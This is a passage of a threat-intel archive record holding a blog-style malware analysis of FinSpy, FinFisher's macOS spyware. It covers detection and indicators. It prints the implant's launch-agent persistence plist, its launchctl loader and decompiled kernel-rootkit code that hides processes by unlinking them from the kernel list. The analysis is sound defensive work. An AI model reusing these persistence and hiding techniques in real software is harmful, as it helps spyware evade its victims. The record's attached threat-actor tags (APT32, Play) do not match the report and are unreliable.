\"event\" : \"ES_EVENT_TYPE_NOTIFY_RENAME\",\n \"file\" : {\n  \"destination\" : \"/Library/LaunchAgents/logind.plist\",\n  \"source\" : \"/Users/user/Library/Caches/org.logind.ctp.archive/logind.plist\"\n }\n}\n{\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_RENAME\",\n \"file\" : {\n  \"destination\" : \"/private/etc/logind\",\n  \"source\" : \"/Users/user/Library/Caches/org.logind.ctp.archive/logind\"\n }\n}\n{\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_RENAME\",\n \"file\" : {\n  \"destination\" : \"/System/Library/Extensions/logind.kext\",\n  \"source\" : \"/Users/user/Library/Caches/org.logind.ctp.archive/logind.kext\"\n }\n}\n{\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_RENAME\",\n \"file\" : {\n  \"destination\" : \"/Library/Frameworks/Storage.framework\",\n  \"source\" : \"/Users/user/Library/Caches/org.logind.ctp.archive/storage.framework\"\n }\n}\n\n```\nOf course (and stop me if you‚Äôve heard this before), the creation of a persistence launch\nagent ( /Library/LaunchAgents/logind.plist ) is detected by [BlockBlock:](https://objective-see.com/products/blockblock.html)\n\n\n-----\n\nAnd speaking of the `logind.plist let‚Äôs take a look at it:`\n```\n$ cat /Library/LaunchAgents/logind.plist\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\"\n\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n    <key>Label</key>\n    <string>org.logind</string>\n    <key>ProgramArguments</key>\n    <array>\n        <string>/private/etc/logind</string>\n    </array>\n    <key>RunAtLoad</key>\n    <true/>\n    <key>KeepAlive</key>\n    <dict>\n        <key>SuccessfulExit</key>\n        <false/>\n    </dict>\n</dict>\n</plist>\n\n```\nAs the `RunAtLoad key is set to` `true, the binary,` `/private/etc/logind will be`\nautomatically (re)executed each time the system is rebooted an the user logs in.\n\nOnce the installer has, well, installed (and setuid‚Äôd) these various components, it kicks off\nthis persistent launch agent via a call to `[GIFileOps loadAgent:]`\n\nThis method simply invokes `launchctl with the` `load command line argument, and path`\nto the `logind.plist to:`\n\n\n-----\n\n```\n 1+(char)loadAgent:(char )plist {\n 2  \n 3  task = [[NSTask alloc] init];\n 4  [task setLaunchPath:@\"/bin/launchctl\"];\n 5  args = [NSArray arrayWithObjects:@\"load\", plist, 0x0];\n 6  [r15 setArguments:args];\n 7\n 8  [task launch];\n 9  [task waitUntilExit];\n10  ...\n11}\n\n```\nThe persistent implant ( /private/etc/logind ), is now off and running!\n\n## Rootkit ( logind.kext )\n\nOne of the (potentially) more interesting aspects of this malware is its kernel-mode rootkit\nfunctionality. Simply put, (public) macOS malware with ring-0 capabilities is rare!\n\nThe file `logind.kext is kernel extension ‚Ä¶albeit unsigned:`\n```\n$ codesign -dvv org.logind.ctp.archive/logind.kext/Contents/MacOS/logind \nlogind.kext/Contents/MacOS/logind: code object is not signed at all\n\n```\nAs the kernel extension is unsigned, it won‚Äôt run on any recent version of macOS (which\nenforce kext code signing requirements).\n\nIt terms of it‚Äôs functionality, it appears to be a simple process hider.\n\nIn a function named `ph_init, the kernel extension looks up a bunch of kernel symbols (via`\na function named `ksym_resolve_symbol_by_crc32 ):`\n\n\n-----\n\n```\n 1void ph_init() {\n 2\n 3  rax = ksym_resolve_symbol_by_crc32(0x127a88e8, rsi, rdx, rcx);\n 4  *_ALLPROC_ADDRESS = rax;\n 5\n 6  ...\n 7\n 8  rax = ksym_resolve_symbol_by_crc32(0xfffffffffef1d247, rsi, rdx, rcx);\n 9  *_LCK_LCK = rax;\n10  if (rax != 0x0) \n11    *_LCK_LCK = *rax;\n12\n13  ...\n14  \n15  rax = ksym_resolve_symbol_by_crc32(0x392ec7ae, rsi, rdx, rcx);\n16  *_LCK_MTX_LOCK = rax;\n17  if (rax != 0x0) \n18    *_LCK_MTX_UNLOCK = ksym_resolve_symbol_by_crc32(0x2472817c, rsi, rdx, rcx);\n19  \n20\n21  return;\n22}\n\n```\nBased on variable names, it appears that `logind.kext is attempting to resolve the pointer`\nof the kernel‚Äôs global list of `proc (process) structures, as well as various locks.`\n\nIn a function named `ph_hide the kext will hide a process. This is done by walking the list of`\n```\nproc structures (pointed to by _ALLPROC_ADDRESS ), and looking for the one that matches\n\n```\n(to hide):\n\n\n-----\n\n```\n 1void _ph_hide(int arg0) {\n 2  \n 3  r14 = arg0;\n 4  if (r14 == 0x0) return;\n 5\n 6  r15 = *_ALLPROC_ADDRESS;\n 7  if (r15 == 0x0) goto return;\n 8\n 9SEARCH:\n10\n11  rax = proc_pid(r15);\n12  rbx = *r15;\n13  if (rax == r14) goto HIDE;\n14\n15loc_15da:\n16  r15 = rbx;\n17  if (rbx != 0x0) goto SEARCH;\n18\n19  return;\n20\n21HIDE:\n22  r14 = *(r15 + 0x8);\n23  (*_LCK_MTX_LOCK)(*_LCK_LCK);\n24  *r14 = rbx;\n25  *(rbx + 0x8) = r14;\n26  (*_LCK_MTX_UNLOCK)(*_LCK_LCK);\n27  return;\n28}\n\n```\nIn the above code, note that `HIDE contains the logic to remove the target process of`\ninterest, by unlinking it from the (process) list. Once removed, the process is now (relatively)\n‚Äúhidden‚Äù. (Of course one can leverage XNU level APIs to uncover such process hiding).\n\nThe malicious kext also appears to be able to communicate with user-mode via the file\n```\n/tmp/launchd-935.U3xqZw . Specifically, in a function named ksym_init, it will open and\n\n```\nread in the contents of this file (which may contain details of the process to hide?):\n\n\n-----\n\n```\n 1void ksym_init(int arg0, int arg1) {\n 2  *(int32_t *)_MKI_SIZE = fileio_get_file_size(\"/tmp/launchd-935.U3xqZw\", arg1);\n 3  rax = _OSMalloc_Tagalloc(\"MKI\", 0x0);\n 4  *_MKI_TAG = rax;\n 5  if (rax == 0x0) goto .l1;\n 6\n 7loc_1898:\n 8  rax = _OSMalloc(*(int32_t *)_MKI_SIZE, rax);\n 9  *_MKI_BUFFER = rax;\n10  if (rax == 0x0) goto loc_1921;\n11\n12loc_18b2:\n13  if (fileio_read_file_fully(\"/tmp/launchd-935.U3xqZw\", rax) == 0x0) goto\nloc_1908;\n14\n15  ....\n16}\n\n```\nFor more on the topic of Mac rootkits, see:\n\n[\"Revisiting Mac OS X Kernel Rootkits\"](http://phrack.org/issues/69/7.html)\nOk, and what about the malware‚Äôs C&C comms? capabilities? and more? Well good news,\nthat‚Äôs already been covered in Amesty‚Äôs [writeup.](https://www.amnesty.org/en/latest/research/2020/09/german-made-finspy-spyware-found-in-egypt-and-mac-and-linux-versions-revealed/)\n\nIn terms of C&C communications, the researchers note:\n\n\"The spyware communicates with the Command & Control (C&C) server using HTTP\nPOST requests. The data sent to the server is encrypted using functions provided by\nthe 7F module, compressed using a custom compressor and base64 encoded\"\n\nMoreover, they uncovered a large list of modules available to the spyware:\n\n## Detections\n\nWe noted our free tools can easily detect FinSpy ‚Ä¶as always, with no a priori knowledge.\n\n\n-----\n\nSpecifically, [BlockBlock can detect the malware at runtime, persisting as a launch agent:](https://objective-see.com/products/blockblock.html)\n\nBlockBlock's detection of FinSpy\n[And if the malware is already present on the system, a KnockKnock scan can reveal this](https://objective-see.com/products/knockknock.html)\nlaunch agent as well:\n\nKnockKnock's detection of FinSpy\nYou might be wondering, without specific knowledge of OSX.FinSpy, how would one know\nthat the item logind, in KnockKnock's scan is indeed malicious?\n\n\n-----\n\nBy design, KnockKnock simply enumerates persistent items installed on macOS system.\nHowever, the logind item sticks out as it is:\n\nunsigned\nunrecognized by VirusTotal\n\n‚Ä¶though this does not guarantee such an item is malicious, these observations (in\nconjunction) are serious red flags, and as such, the item should be closely examined.\n\nTo manually detect (this) variant of of OSX.FinSpy, one could also manually check for the\nexistence of:\n```\n   /private/etc/logind\n   sha1: 62e5dc40bfabaa712cd9e32ac755384db07f0dab\n   /Library/LaunchAgents/logind.plist\n   sha1: a2aba86d5d763f311dff8250bc8fe98de958bff4\n   logind.kext (likely in /Library/Extensions/ )\n   sha1: 18e1d03e41b5fc6d54fdda340fe2dab219502f3d\n\n## Conclusion\n\n```\nToday, we triaged FinFisher‚Äôs macOS implant, FinSpy.\n\nAlthough rather somewhat dated, it provided an intriguing look into the world of commercial\ncyber-espionage malware. And yes, the exploits it leveraged were all public (and long\npatched) and its rootkit capabilities were rather mundane ‚Ä¶but let‚Äôs not forget that a more\nmodern version of this threat (or similar commercial implant) could be far more sophisticated!\n\n## üíï Support Us:\n\n[Love these blog posts? You can support them via my Patreon page!](https://www.patreon.com/bePatron?c=701171)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-09-26 - FinFisher Filleted- a triage of the FinSpy (macOS) malware.pdf"
    ],
    "report_names": [
        "2020-09-26 - FinFisher Filleted- a triage of the FinSpy (macOS) malware.pdf"
    ],
    "threat_actors": [
        {
            "id": "af509bbb-8d18-4903-a9bd-9e94099c6b30",
            "created_at": "2023-01-06T13:46:38.585525Z",
            "updated_at": "2025-03-27T02:00:02.866727Z",
            "deleted_at": null,
            "main_name": "APT32",
            "aliases": [
                "TIN WOODLAWN",
                "OceanLotus Group",
                "OceanLotus",
                "Sea Lotus",
                "G0050",
                "Cobalt Kitty",
                "SeaLotus",
                "ATK17",
                "Ocean Lotus",
                "Ocean Buffalo",
                "POND LOACH",
                "Canvas Cyclone",
                "APT-C-00",
                "APT-32",
                "APT 32"
            ],
            "source_name": "MISPGALAXY:APT32",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673536061,
    "ts_updated_at": 1743041785,
    "ts_creation_date": 1653787408,
    "ts_modification_date": 1653787408,
    "files": {
        "pdf": "https://archive.orkl.eu/d27d09836f5a530d6c231c4fe6fb5026e78348c3.pdf",
        "text": "https://archive.orkl.eu/d27d09836f5a530d6c231c4fe6fb5026e78348c3.txt",
        "img": "https://archive.orkl.eu/d27d09836f5a530d6c231c4fe6fb5026e78348c3.jpg"
    }
}